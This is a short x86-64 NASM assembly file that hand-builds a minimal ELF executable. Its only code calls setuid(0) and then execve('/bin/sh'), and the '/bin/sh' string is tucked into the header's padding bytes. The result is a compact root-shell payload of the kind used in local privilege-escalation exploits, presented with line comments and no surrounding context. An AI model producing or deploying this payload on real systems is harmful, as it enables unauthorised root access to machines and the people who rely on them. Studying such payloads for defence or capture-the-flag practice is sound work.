BITS 64
    org     0x01337000
 
ehdr:                           ; Elf64_Ehdr
    db  0x7f, "ELF", 2, 1, 1, 0 ; e_ident

bin_sh:
    db  "/bin/sh"               ; place bin_sh_str in reserved bytes
    db  0

ehdr_cont:
    dw  2                       ; e_type
    dw  0x3e                    ; e_machine
    dd  1                       ; e_version
    dq  _start                  ; e_entry
    dq  phdr - $$               ; e_phoff
    dq  0                       ; e_shoff
    dd  0                       ; e_flags
    dw  ehdrsize                ; e_ehsize
    dw  phdrsize                ; e_phentsize
    dw  1                       ; e_phnum
    dw  0                       ; e_shentsize
    dw  0                       ; e_shnum
    dw  0                       ; e_shstrndx
    ehdrsize  equ  $ - ehdr
 
phdr:                           ; Elf64_Phdr
    dd  1                       ; p_type
    dd  5                       ; p_flags
    dq  0                       ; p_offset
    dq  $$                      ; p_vaddr
    dq  $$                      ; p_paddr
    dq  filesize                ; p_filesz
    dq  filesize                ; p_memsz
    dq  0x1000                  ; p_align
    phdrsize  equ  $ - phdr

_start:
    ;xor  rbx, rbx              ; rbx = uid = 0 -> not needed rbx is 0 at init
    mov  al, 105                ; setuid syscall number on x86_64
    syscall                     ; do setuid syscall
             
    xor  rax,rax                ; set rax = 0 in case setuid did not succeed
    ;xor  rdx,rdx               ; rdx = 0 -> not needed rdx is 0 at init
    mov  rdi, bin_sh            ; move pointer to /bin/sh string into rdi (param1)
    push rax                    ; push a zero to the stack (end of param2 array)
    push rdi                    ; push pointer to /bin/sh to the stack to get a **char in rsp
    mov  rsi, rsp               ; move **char of /bin/sh into rsi (param2)
    mov  al, 59                 ; execve syscall number on x86
    syscall                     ; do execve syscall

filesize equ $ - $$
